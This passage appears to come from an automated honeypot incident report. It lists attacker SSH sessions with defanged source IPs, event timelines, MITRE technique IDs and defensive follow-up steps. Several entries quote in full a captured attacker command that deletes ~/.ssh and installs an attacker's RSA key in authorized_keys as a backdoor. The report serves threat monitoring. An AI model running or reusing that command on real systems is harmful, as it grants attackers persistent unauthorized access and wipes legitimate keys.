| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 08:42:42` | `cowrie.session.connect` |
| `2026-05-26 08:42:42` | `cowrie.client.version` |
| `2026-05-26 08:42:42` | `cowrie.client.kex` |
| `2026-05-26 08:42:43` | `cowrie.login.success` |
| `2026-05-26 08:42:44` | `cowrie.session.params` |
| `2026-05-26 08:42:44` | `cowrie.command.input` |
| `2026-05-26 08:42:44` | `cowrie.command.failed` |
| `2026-05-26 08:42:44` | `cowrie.log.closed` |
| `2026-05-26 08:42:44` | `cowrie.session.params` |
| `2026-05-26 08:42:44` | `cowrie.command.input` |
| `2026-05-26 08:42:44` | `cowrie.session.file_download` |
| `2026-05-26 08:42:44` | `cowrie.log.closed` |
| `2026-05-26 08:42:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.222.230[.]188` to AbuseIPDB if not already reported
- [ ] Block `183.222.230[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41d78e477826

| Field | Detail |
|---|---|
| **Source IP** | `183.222.230[.]188` |
| **First Seen** | 2026-05-26 08:42 |
| **Last Seen** | 2026-05-26 08:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 08:42:47` | `cowrie.session.connect` |
| `2026-05-26 08:42:47` | `cowrie.client.version` |
| `2026-05-26 08:42:47` | `cowrie.client.kex` |
| `2026-05-26 08:42:48` | `cowrie.login.success` |
| `2026-05-26 08:42:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.222.230[.]188` to AbuseIPDB if not already reported
- [ ] Block `183.222.230[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee966996eed8

| Field | Detail |
|---|---|
| **Source IP** | `183.222.230[.]188` |
| **First Seen** | 2026-05-26 08:54 |
| **Last Seen** | 2026-05-26 08:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 08:54:06` | `cowrie.session.connect` |
| `2026-05-26 08:54:06` | `cowrie.client.version` |
| `2026-05-26 08:54:06` | `cowrie.client.kex` |
| `2026-05-26 08:54:07` | `cowrie.login.success` |
| `2026-05-26 08:54:07` | `cowrie.session.params` |
| `2026-05-26 08:54:07` | `cowrie.command.input` |
| `2026-05-26 08:54:07` | `cowrie.command.failed` |
| `2026-05-26 08:54:08` | `cowrie.log.closed` |
| `2026-05-26 08:54:08` | `cowrie.session.params` |
| `2026-05-26 08:54:08` | `cowrie.command.input` |
| `2026-05-26 08:54:08` | `cowrie.session.file_download` |
| `2026-05-26 08:54:08` | `cowrie.log.closed` |
| `2026-05-26 08:54:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.222.230[.]188` to AbuseIPDB if not already reported
- [ ] Block `183.222.230[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-098ecd6e9b7c

| Field | Detail |
|---|---|
| **Source IP** | `183.222.230[.]188` |
| **First Seen** | 2026-05-26 08:54 |
| **Last Seen** | 2026-05-26 08:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 08:54:11` | `cowrie.session.connect` |
| `2026-05-26 08:54:11` | `cowrie.client.version` |
| `2026-05-26 08:54:11` | `cowrie.client.kex` |
| `2026-05-26 08:54:12` | `cowrie.login.success` |
| `2026-05-26 08:54:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.222.230[.]188` to AbuseIPDB if not already reported
- [ ] Block `183.222.230[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b98977336e6

| Field | Detail |
|---|---|
| **Source IP** | `116.110.6[.]117` |
| **First Seen** | 2026-05-26 10:03 |
| **Last Seen** | 2026-05-26 10:04 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 10:03:39` | `cowrie.session.connect` |
| `2026-05-26 10:03:39` | `cowrie.client.version` |
| `2026-05-26 10:03:40` | `cowrie.client.kex` |
| `2026-05-26 10:03:43` | `cowrie.login.success` |
| `2026-05-26 10:03:54` | `cowrie.direct-tcpip.request` |
| `2026-05-26 10:04:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-05-26 10:04:00` | `cowrie.direct-tcpip.data` |
| `2026-05-26 10:04:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.6[.]117` to AbuseIPDB if not already reported
- [ ] Block `116.110.6[.]117` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f4ea05057f1

| Field | Detail |
|---|---|
| **Source IP** | `179.33.210[.]213` |
| **First Seen** | 2026-05-26 10:39 |
| **Last Seen** | 2026-05-26 10:40 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 10:39:46` | `cowrie.session.connect` |
| `2026-05-26 10:39:46` | `cowrie.client.version` |
| `2026-05-26 10:39:46` | `cowrie.client.kex` |
| `2026-05-26 10:39:49` | `cowrie.login.success` |
| `2026-05-26 10:39:50` | `cowrie.session.params` |
| `2026-05-26 10:39:50` | `cowrie.command.input` |
| `2026-05-26 10:39:50` | `cowrie.command.failed` |
| `2026-05-26 10:39:51` | `cowrie.log.closed` |
| `2026-05-26 10:39:52` | `cowrie.session.params` |
| `2026-05-26 10:39:52` | `cowrie.command.input` |
| `2026-05-26 10:39:53` | `cowrie.session.file_download` |
| `2026-05-26 10:39:53` | `cowrie.log.closed` |
| `2026-05-26 10:40:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.210[.]213` to AbuseIPDB if not already reported
- [ ] Block `179.33.210[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b545fb899d31

| Field | Detail |
|---|---|
| **Source IP** | `179.33.210[.]213` |
| **First Seen** | 2026-05-26 10:39 |
| **Last Seen** | 2026-05-26 10:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 10:39:58` | `cowrie.session.connect` |
| `2026-05-26 10:39:58` | `cowrie.client.version` |
| `2026-05-26 10:39:59` | `cowrie.client.kex` |
| `2026-05-26 10:40:01` | `cowrie.login.success` |
| `2026-05-26 10:40:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.210[.]213` to AbuseIPDB if not already reported
- [ ] Block `179.33.210[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8d761b1b7af

| Field | Detail |
|---|---|
| **Source IP** | `179.33.210[.]213` |
| **First Seen** | 2026-05-26 10:41 |
| **Last Seen** | 2026-05-26 10:41 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 10:41:04` | `cowrie.session.connect` |
| `2026-05-26 10:41:04` | `cowrie.client.version` |
| `2026-05-26 10:41:04` | `cowrie.client.kex` |
| `2026-05-26 10:41:07` | `cowrie.login.success` |
| `2026-05-26 10:41:08` | `cowrie.session.params` |
| `2026-05-26 10:41:08` | `cowrie.command.input` |
| `2026-05-26 10:41:08` | `cowrie.command.failed` |
| `2026-05-26 10:41:09` | `cowrie.log.closed` |
| `2026-05-26 10:41:10` | `cowrie.session.params` |
| `2026-05-26 10:41:10` | `cowrie.command.input` |
| `2026-05-26 10:41:11` | `cowrie.session.file_download` |
| `2026-05-26 10:41:11` | `cowrie.log.closed` |
| `2026-05-26 10:41:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.210[.]213` to AbuseIPDB if not already reported
- [ ] Block `179.33.210[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47d242438f69

| Field | Detail |
|---|---|
| **Source IP** | `179.33.210[.]213` |
| **First Seen** | 2026-05-26 10:41 |
| **Last Seen** | 2026-05-26 10:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 10:41:17` | `cowrie.session.connect` |
| `2026-05-26 10:41:17` | `cowrie.client.version` |
| `2026-05-26 10:41:17` | `cowrie.client.kex` |
| `2026-05-26 10:41:19` | `cowrie.login.success` |
| `2026-05-26 10:41:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.210[.]213` to AbuseIPDB if not already reported
- [ ] Block `179.33.210[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7279af67faa

| Field | Detail |
|---|---|
| **Source IP** | `179.33.210[.]213` |
| **First Seen** | 2026-05-26 10:43 |
| **Last Seen** | 2026-05-26 10:43 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 10:43:25` | `cowrie.session.connect` |
| `2026-05-26 10:43:25` | `cowrie.client.version` |
| `2026-05-26 10:43:25` | `cowrie.client.kex` |
| `2026-05-26 10:43:28` | `cowrie.login.success` |
| `2026-05-26 10:43:29` | `cowrie.session.params` |
| `2026-05-26 10:43:29` | `cowrie.command.input` |
| `2026-05-26 10:43:29` | `cowrie.command.failed` |
| `2026-05-26 10:43:31` | `cowrie.log.closed` |
| `2026-05-26 10:43:31` | `cowrie.session.params` |
| `2026-05-26 10:43:31` | `cowrie.command.input` |
| `2026-05-26 10:43:32` | `cowrie.session.file_download` |
| `2026-05-26 10:43:32` | `cowrie.log.closed` |
| `2026-05-26 10:43:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.210[.]213` to AbuseIPDB if not already reported
- [ ] Block `179.33.210[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-967efb2875ae

| Field | Detail |
|---|---|
| **Source IP** | `179.33.210[.]213` |
| **First Seen** | 2026-05-26 10:43 |
| **Last Seen** | 2026-05-26 10:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 10:43:38` | `cowrie.session.connect` |
| `2026-05-26 10:43:38` | `cowrie.client.version` |
| `2026-05-26 10:43:39` | `cowrie.client.kex` |
| `2026-05-26 10:43:40` | `cowrie.login.success` |
| `2026-05-26 10:43:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.210[.]213` to AbuseIPDB if not already reported
- [ ] Block `179.33.210[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31ed4920050f

| Field | Detail |
|---|---|
| **Source IP** | `179.33.210[.]213` |
| **First Seen** | 2026-05-26 10:44 |
| **Last Seen** | 2026-05-26 10:44 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 10:44:34` | `cowrie.session.connect` |
| `2026-05-26 10:44:34` | `cowrie.client.version` |
| `2026-05-26 10:44:34` | `cowrie.client.kex` |
| `2026-05-26 10:44:37` | `cowrie.login.success` |
| `2026-05-26 10:44:38` | `cowrie.session.params` |
| `2026-05-26 10:44:38` | `cowrie.command.input` |
| `2026-05-26 10:44:38` | `cowrie.command.failed` |
| `2026-05-26 10:44:40` | `cowrie.log.closed` |
| `2026-05-26 10:44:40` | `cowrie.session.params` |
| `2026-05-26 10:44:40` | `cowrie.command.input` |
| `2026-05-26 10:44:41` | `cowrie.session.file_download` |
| `2026-05-26 10:44:41` | `cowrie.log.closed` |
| `2026-05-26 10:44:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.210[.]213` to AbuseIPDB if not already reported
- [ ] Block `179.33.210[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6ae7fa67abd

| Field | Detail |
|---|---|
| **Source IP** | `179.33.210[.]213` |
| **First Seen** | 2026-05-26 10:44 |
| **Last Seen** | 2026-05-26 10:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 10:44:47` | `cowrie.session.connect` |
| `2026-05-26 10:44:47` | `cowrie.client.version` |
| `2026-05-26 10:44:48` | `cowrie.client.kex` |
| `2026-05-26 10:44:49` | `cowrie.login.success` |
| `2026-05-26 10:44:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.210[.]213` to AbuseIPDB if not already reported
- [ ] Block `179.33.210[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-819861a7abc0

| Field | Detail |
|---|---|
| **Source IP** | `179.33.210[.]213` |
| **First Seen** | 2026-05-26 10:50 |
| **Last Seen** | 2026-05-26 10:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 10:50:00` | `cowrie.session.connect` |
| `2026-05-26 10:50:00` | `cowrie.client.version` |
| `2026-05-26 10:50:00` | `cowrie.client.kex` |
| `2026-05-26 10:50:01` | `cowrie.login.success` |
| `2026-05-26 10:50:02` | `cowrie.session.params` |
| `2026-05-26 10:50:02` | `cowrie.command.input` |
| `2026-05-26 10:50:02` | `cowrie.command.failed` |
| `2026-05-26 10:50:03` | `cowrie.log.closed` |
| `2026-05-26 10:50:03` | `cowrie.session.params` |
| `2026-05-26 10:50:03` | `cowrie.command.input` |
| `2026-05-26 10:50:03` | `cowrie.session.file_download` |
| `2026-05-26 10:50:03` | `cowrie.log.closed` |
| `2026-05-26 10:50:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.210[.]213` to AbuseIPDB if not already reported
- [ ] Block `179.33.210[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbfdf8dd8f12

| Field | Detail |
|---|---|
| **Source IP** | `179.33.210[.]213` |
| **First Seen** | 2026-05-26 10:50 |
| **Last Seen** | 2026-05-26 10:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 10:50:07` | `cowrie.session.connect` |
| `2026-05-26 10:50:07` | `cowrie.client.version` |
| `2026-05-26 10:50:07` | `cowrie.client.kex` |
| `2026-05-26 10:50:08` | `cowrie.login.success` |
| `2026-05-26 10:50:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.210[.]213` to AbuseIPDB if not already reported
- [ ] Block `179.33.210[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d199c9de4e9c

| Field | Detail |
|---|---|
| **Source IP** | `179.33.210[.]213` |
| **First Seen** | 2026-05-26 10:50 |
| **Last Seen** | 2026-05-26 10:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 10:50:52` | `cowrie.session.connect` |
| `2026-05-26 10:50:52` | `cowrie.client.version` |
| `2026-05-26 10:50:52` | `cowrie.client.kex` |
| `2026-05-26 10:50:53` | `cowrie.login.success` |
| `2026-05-26 10:50:54` | `cowrie.session.params` |
| `2026-05-26 10:50:54` | `cowrie.command.input` |
| `2026-05-26 10:50:54` | `cowrie.command.failed` |
| `2026-05-26 10:50:55` | `cowrie.log.closed` |
| `2026-05-26 10:50:55` | `cowrie.session.params` |
| `2026-05-26 10:50:55` | `cowrie.command.input` |
| `2026-05-26 10:50:55` | `cowrie.session.file_download` |
| `2026-05-26 10:50:55` | `cowrie.log.closed` |
| `2026-05-26 10:51:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.210[.]213` to AbuseIPDB if not already reported
- [ ] Block `179.33.210[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69bb3e540cfa

| Field | Detail |
|---|---|
| **Source IP** | `179.33.210[.]213` |
| **First Seen** | 2026-05-26 10:50 |
| **Last Seen** | 2026-05-26 10:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 10:50:59` | `cowrie.session.connect` |
| `2026-05-26 10:50:59` | `cowrie.client.version` |
| `2026-05-26 10:50:59` | `cowrie.client.kex` |
| `2026-05-26 10:51:00` | `cowrie.login.success` |
| `2026-05-26 10:51:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.210[.]213` to AbuseIPDB if not already reported
- [ ] Block `179.33.210[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c11502e1f32b

| Field | Detail |
|---|---|
| **Source IP** | `179.33.210[.]213` |
| **First Seen** | 2026-05-26 10:51 |
| **Last Seen** | 2026-05-26 10:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
